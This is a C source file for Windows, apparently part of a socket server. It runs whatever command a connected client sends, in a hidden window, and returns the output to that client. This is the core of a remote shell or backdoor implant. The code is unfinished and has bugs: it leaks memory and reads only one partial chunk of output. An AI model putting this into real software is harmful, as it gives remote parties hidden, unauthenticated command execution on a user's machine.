#include "Execute.h"

BOOL ExecuteCommand(PSERVERPARAM pServerParam)
{
    if (!pServerParam || INVALID_SOCKET == pServerParam->ClientSock)
    {
        return FALSE;
    }
    HANDLE hStdInPipeRead = INVALID_HANDLE_VALUE; 
    HANDLE hStdInPipeWrite = INVALID_HANDLE_VALUE;
    HANDLE hStdOutPipeRead = INVALID_HANDLE_VALUE;
    HANDLE hStdOutPipeWrite = INVALID_HANDLE_VALUE;

    // Sec Attributes for the pipes 
    SECURITY_ATTRIBUTES saAttr = { sizeof(SECURITY_ATTRIBUTES) };
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;

    
    // Input pipe creation 
    if (!CreatePipe(&hStdInPipeRead, &hStdInPipeWrite, &saAttr, 0))
        return FALSE; 

    // Output Pipe creation 
    if (!CreatePipe(&hStdOutPipeRead, &hStdOutPipeWrite, &saAttr, 0))
    {
        CloseHandle(hStdInPipeRead);
        CloseHandle(hStdInPipeWrite);
        return FALSE;
    }

    // TODO: Need to fix the multibyte conversion to properly work and create appropriate process 
    // TODO: Should keep this on the stack instead of allocated space for it
    wchar_t *command = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pServerParam->ClientData->len * sizeof(wchar_t));
    MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, pServerParam->ClientData->buf, -1, command, pServerParam->ClientData->len);

    //wchar_t command[] = L"C:\\Windows\\System32\\cmd.exe /c whoami";
    HANDLE out = GetStdHandle(STD_OUTPUT_HANDLE);
    STARTUPINFOW startInf;
    SecureZeroMemory(&startInf, sizeof(STARTUPINFOW));

    // Lineup the startup information to create the process 
    startInf.cb = sizeof(startInf);
    startInf.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    startInf.hStdOutput = hStdOutPipeWrite;
    startInf.hStdError = hStdOutPipeWrite;
    startInf.hStdInput = hStdInPipeRead; 
    startInf.wShowWindow = SW_HIDE;
    // No popup window 
    //startInf.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION procInf;
    SecureZeroMemory(&procInf, sizeof(procInf));

    BOOL status = CreateProcessW(
        NULL, 
        command, 
        NULL, 
        NULL, 
        TRUE, 
        NORMAL_PRIORITY_CLASS, 
        NULL, 
        NULL, 
        &startInf, 
        &procInf);
    // TODO: Write to stdpipe or seomthign of that nature to get the data from proc
    
    // Close unneeded pipes
    CloseHandle(hStdOutPipeWrite);
    CloseHandle(hStdInPipeRead);

    DWORD dwError = 0;
    if (status != 0)
    {
        // TODO: Temp reading to get access to the data 
        DWORD dwRead = 0;
        DWORD dwAvail = 0;
        char tmp[1025] = { 0 };
        ReadFile(hStdOutPipeRead, tmp, 1024, &dwRead, NULL);
        tmp[dwRead] = '\0';
        // Example push back to client
        // TODO: This works, but needs cleaning and more fidelity 
        SecureZeroMemory(pServerParam->ClientData->buf, pServerParam->ClientData->len);
        memcpy(pServerParam->ClientData->buf, tmp, dwRead);
        pServerParam->ClientData->len = dwRead; 
        // TODO: Clean up above and read all data 

        GetExitCodeProcess(procInf.hProcess, &dwError);
        CloseHandle(hStdOutPipeRead);
        CloseHandle(hStdInPipeWrite);
        CloseHandle(procInf.hThread);
        CloseHandle(procInf.hProcess);
    }
    else 
    {
        DbgPrintErr(L"Failed to create process\n");
    }
    if (dwError)
    {
        DbgPrintErr(L"Process Exit Code: %d\n", dwError);
    }
    return TRUE;
}
